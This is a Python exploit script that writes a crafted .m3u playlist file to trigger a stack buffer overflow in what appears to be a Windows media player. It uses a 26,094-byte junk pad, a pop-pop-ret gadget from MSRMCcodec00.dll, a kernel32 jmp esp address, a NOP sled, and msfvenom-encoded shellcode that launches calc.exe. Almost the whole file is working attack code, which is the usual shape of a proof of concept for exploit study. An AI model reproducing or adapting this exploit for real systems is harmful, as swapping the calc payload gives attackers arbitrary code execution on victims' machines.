import struct, os
INPUT_FILE = "input.txt"
OUT = f"payload/xp_{os.path.basename(__file__)[:-3]}.m3u"

def create_initial_garbage():
    f_input = open(INPUT_FILE, "r")
    junk = f_input.read()
    input_len = len(junk)
    OUTPUT_FILE = f"payload/out_{input_len}.m3u"
    f_output = open(OUTPUT_FILE, "wb")
    junk = bytearray(junk, "utf-8")
    f_output.write(junk)
    return input_len


junk = "A" * 26094

#
# pop pop ret 0x01c87f03 | MSRMCcodec00.dll
#

eip = struct.pack("<I", 0xdeadbeef)

pop_pop_ret = struct.pack("<I", 0x01c87f03) # pop pop ret from MSRMCcodec00.dll
jmp_esp = struct.pack("<I", 0x7C86467B) # jmp esp from kernel32.dll

nop_sled = b"\x90" * 8
shellcode = b"\xcc" * 20
"""
└─# msfvenom -p windows/exec cmd=calc.exe -e x86/countdown A --smallest -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown succeeded with size 210 (iteration=0)
x86/countdown chosen with final size 210
Payload size: 210 bytes
Final size of python file: 1038 bytes
"""
buf =  b""
buf += b"\x2b\xc9\xb1\xc0\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
buf += b"\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67\x81\xec"
buf += b"\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98\x46\x01\x9d"
buf += b"\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3\x1c\x40\x5e\x21"
buf += b"\x08\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79\xa4\x62"
buf += b"\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72\x3a\xed\x6c"
buf += b"\xb5\x66\x60\x40\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e"
buf += b"\xc0\x4d\x9b\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7"
buf += b"\x2d\xaf\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c"
buf += b"\x41\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
buf += b"\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24"
buf += b"\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
buf += b"\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10\x67"
buf += b"\x4c\x21\x6b\x29\x3f\xc8\xf7\x06\x34\x1f\x3e\x5b\x70"
buf += b"\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7\xa2\xc0"
buf += b"\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7\xdf\x93\xdb\xc7"
buf += b"\xa5\xc1"
shellcode = buf
prepend_esp = b"BBBB"

junk = bytes(junk, encoding="utf-8")
payload = junk + pop_pop_ret +  nop_sled + prepend_esp + jmp_esp + shellcode
f_out = open(OUT, "wb")
f_out.write(payload)
f_out.close()
